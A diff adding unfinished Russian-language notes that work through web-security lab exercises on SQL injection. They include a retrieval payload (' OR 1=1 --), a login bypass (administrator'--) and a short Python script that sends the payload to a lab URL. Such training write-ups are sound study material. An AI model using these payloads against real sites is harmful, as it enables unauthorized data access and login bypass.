@@ -1,0 +1,48 @@
+Решение Задач по SQL
+
+1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+Добавляем в запрос сначала ', чтобы понять логику: ошибка сервера
+Добавляем '--  фильтрует по категории, у которой нет значения, а все остальное отбрасывается
+Добавляем ' OR 1=1 -- работает, т.к. он пропускает первое условие, 1=1 истино, остальное отбрасывается
+
+Сделаем через Python script
+nano sql-lab1.py
+import requests
+
+url = "https://0a7700f4032e222e80ad21a0006500f7.web-security-academy.net/"
+
+params = {
+        "category": "' OR 1=1 --"
+}
+
+response = requests.get(url, params=params)
+
+print(response.status_code)
+print(response.url)
+if "Congratulations, you solved the lab!" in response.text:
+        print("Лабораторная сделана :)")
+
+Результат выполнения python3 sql-lab1.py: 
+200
+https://0a7700f4032e222e80ad21a0006500f7.web-security-academy.net/?category=%27+OR+1%3D1+--
+Лабораторная сделана :)
+
+2. Lab: SQL injection vulnerability allowing login bypass
+пропубем вариант без Burp Repeater
+Добавляем в запрос сначала ', чтобы понять логику: ошибка сервера
+добавляем в запрос admin'--: invalid username or password. т.е. обработка есть, но нет такого юзера
+administrator'-- удалось
+
+3. SQL injection UNION attack, determining the number of columns returned by the query
+
+
+
+
+SQL injection attack, querying the database type and version on Oracle
+здесь у нас классическая SQL-инъекция на основе ошибок
+добавляем в запрос '
+
+
+
+
+
